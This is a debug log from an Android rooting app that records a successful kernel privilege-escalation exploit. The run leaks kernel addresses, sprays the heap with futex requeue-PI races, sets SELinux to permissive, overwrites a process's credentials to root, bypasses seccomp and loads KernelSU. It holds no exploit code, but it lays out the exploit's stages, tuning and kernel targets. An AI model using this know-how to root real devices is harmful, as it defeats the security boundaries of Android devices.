debug log: Download/GhostLock/ghostlock-20260914-103501-985-0-direct.log
ksud ready
[*] kernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[+] resolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] cpu pair: main=0 consumer=1
[*] runtime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[*] runtime verbose_debug=1
[*] debug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] debug.execution.recommended_cpus.main=0
[*] debug.execution.recommended_cpus.consumer=1
[*] debug.execution.selected_cpus.main=0
[*] debug.execution.selected_cpus.consumer=1
[*] debug.execution.heap.prepare_max_attempts=4
[*] debug.execution.heap.prepare_timeout_ms=240000
[*] debug.execution.heap.kernelsnitch_timeout_ms=60000
[*] debug.execution.race.route_wait_ms=1000
[*] debug.execution.race.setup_settle_us=50000
[*] debug.execution.race.state_poll_interval_us=1000
[*] debug.execution.stages.w1_attempts=15
[*] debug.execution.stages.w1_settle_us=100000
[*] debug.execution.stages.w1_scratch_repair_attempts=3
[*] debug.execution.stages.w2_attempts=15
[*] debug.execution.stages.w2_settle_us=100000
[*] debug.execution.stages.w3_chain_rounds=3
[*] debug.execution.stages.w3_attempts=6
[*] debug.execution.stages.w3_settle_us=50000
[*] debug.execution.routes.tcp_zerocopy.attempts=2000
[*] debug.execution.routes.tcp_zerocopy.arm_sequence=16
[*] debug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[*] debug.execution.routes.select_stack.enter_delay_us=50000
[*] debug.execution.routes.select_stack.timeout_us=200000
[*] debug.execution.routes.select_stack.consumer_max_calls=1
[*] debug.execution.routes.select_stack.consumer_burst_calls=1
[*] debug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[*] debug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[*] debug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[*] debug.execution.handoff.pre_dispatch_settle_ms=2000
[*] debug.execution.handoff.module_poll_attempts=30
[*] debug.execution.handoff.module_poll_interval_ms=100
[*] debug.execution.handoff.enforce_poll_attempts=200
[*] debug.execution.handoff.enforce_poll_interval_ms=100
[*] debug.execution.end
[*] soc: qcom/other; kernel_phys_load=0xa8000000
[*] init_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[+] startup context pid=11539 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=45084 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[+] startup limits pid=11539 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[+] build config pid=11539 label=ghostlock_oplus slide=pselect main=pselect
[+] p0 profile pid=11539 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[*] p0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[*] main thread running on cpu=0
[*] [T+0ms] exploit start
[-] SELinux enforce unreadable; assuming enforcing and running W1
[*] [T+1ms] pre-W1 drain
[*] W1: SELinux attempt 1/1
[*] === W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[*] [T+79ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +279ms
[*] [spray] finding futex collisions... +597ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray]   still finding collisions (2s) 31% (futex 0xa000000/0x1000000000)...
[*] [spray] futex collisions found +2820ms
[*] [spray] mm_struct leaked=0xffffff8025721000 +2833ms
[*] [spray] payload ready +2836ms
[-] page ffffff8025720000 stores an even byte over selinux_state.initialized; taking another
[-] prepare_kernel_page retry 1/4 +3013ms
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +287ms
[*] [spray] finding futex collisions... +635ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +2228ms
[*] [spray] mm_struct leaked=0xffffff8920e1a000 +2257ms
[*] [spray] payload ready +2261ms
[*] prepare_kernel_page ok attempt=2 +5419ms
[*] [T+5499ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=1
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] multicast route status=0 clean=1/1 step=0 errno=0
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] [T+7508ms]   PI route done
[+] SELinux permissive
[*] W1b: private scratch repair attempt 1/3
[*] === W1b: private scratch repair === target=0xffffff8920e18108 mode=1 leaf=1
[*] [T+7612ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +236ms
[*] [spray] finding futex collisions... +475ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +2069ms
[*] [spray] mm_struct leaked=0xffffff89cf0a2000 +2130ms
[*] [spray] payload ready +2134ms
[*] prepare_kernel_page ok attempt=1 +2293ms
[*] [T+9910ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=1
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] multicast route status=0 clean=1/1 step=0 errno=0
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] [T+11918ms]   PI route done
[+] private scratch repaired; releasing quarantine
[*] [T+11918ms] Write 1 complete
[*] [T+11984ms] pre-W2 drain
[*] perf task: 0xffffff89051b4800 (177/256 votes)
[*] perf task: 0xffffff89051b4800 (177/256 votes)
[*] [T+12762ms] perf_find_task done
[*] child_pid=20054 child_task=0xffffff89051b4800
[*] vr.ko not loaded; skipping tag clear
[*] W2: cred attempt 1/15
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +222ms
[*] [spray] finding futex collisions... +438ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +2056ms
[*] [spray] mm_struct leaked=0xffffff88c0a7b000 +2170ms
[*] [spray] payload ready +2174ms
[*] prepare_kernel_page ok attempt=1 +2335ms
[*] W2 fast repair payload prebuilt
[*] === W2: cred === target=0xffffff89051b4f98 mode=2 leaf=0
[*] [T+15161ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +224ms
[*] [spray] finding futex collisions... +446ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +2000ms
[*] [spray] mm_struct leaked=0xffffff8902382400 +2004ms
[*] [spray] payload ready +2013ms
[*] prepare_kernel_page ok attempt=1 +2167ms
[*] [T+17331ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] [route] waiter parked; owner started
[*] consumer thread running on cpu=1
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] multicast route status=0 clean=1/1 step=0 errno=0
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] [T+19338ms]   PI route done
[*] W2b: firing prebuilt init_cred+8 repair
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=1
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] multicast route status=0 clean=1/1 step=0 errno=0
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] child uid = 0
[+] child is root!
[*] W3: TIF_SECCOMP+mode attempt 1/6
[*] === W3: TIF_SECCOMP === target=0xffffff89051b4800 mode=1 leaf=1
[*] [T+20661ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +231ms
[*] [spray] finding futex collisions... +452ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +2024ms
[*] [spray] mm_struct leaked=0xffffff8917ab3800 +2047ms
[*] [spray] payload ready +2048ms
[*] prepare_kernel_page ok attempt=1 +2203ms
[*] [T+22869ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] [route] waiter parked; owner started
[*] consumer thread running on cpu=1
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] multicast route status=0 clean=1/1 step=0 errno=0
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] [T+24875ms]   PI route done
[*] === W3: seccomp mode === target=0xffffff89051b5060 mode=1 leaf=1
[*] [T+24930ms]   heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +231ms
[*] [spray] finding futex collisions... +464ms
[*] [spray] early collision screen 16/7 at 31%
[*] [spray] futex collisions found +1984ms
[*] [spray] mm_struct leaked=0xffffff88a973f000 +2075ms
[*] [spray] payload ready +2079ms
[*] prepare_kernel_page ok attempt=1 +2235ms
[*] [T+27169ms]   heap spray done
[*] [route] creating waiter/owner/consumer
[*] consumer thread running on cpu=1
[*] [route] waiter parked; owner started
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[*] multicast route status=0 clean=1/1 step=0 errno=0
[*] mcast ghost disarm ret=-1 errno=110
[*] [route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[*] [route] threads joined
[*] [T+29176ms]   PI route done
[*] seccomp finit_module probe = 0x16
[+] child seccomp filter bypassed (finit_module errno=22)
[+] child seccomp fully bypassed (forked workers run filter-free)
[*] [T+31235ms] exploit complete
[*] root script start uid=0 euid=0
[*] seccomp=Seccomp:	0 Seccomp_filters:	0 
[*] ksud=/data/user/0/com.ghostlock.app/files/ksud
[*] ksud_file=-rwx------ 1 u0_a510 u0_a510 4892712 2026-09-14 10:35 /data/user/0/com.ghostlock.app/files/ksud
[*] uname=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] fixup: attempt 1
1+0 records in
1+0 records out
1 bytes (1 B) copied, 0.013 s, 76 B/s
[*] policyload before=0 after=2
[*] policy fixup rc=0
[*] late-load kmi=android13-5.15
[*] late-load exit=0
[*] temp su uid=0; watching kernelsu.ko
[+] KernelSU module loaded
[*] enforce=1 (enforcing)
[+] KernelSU ready
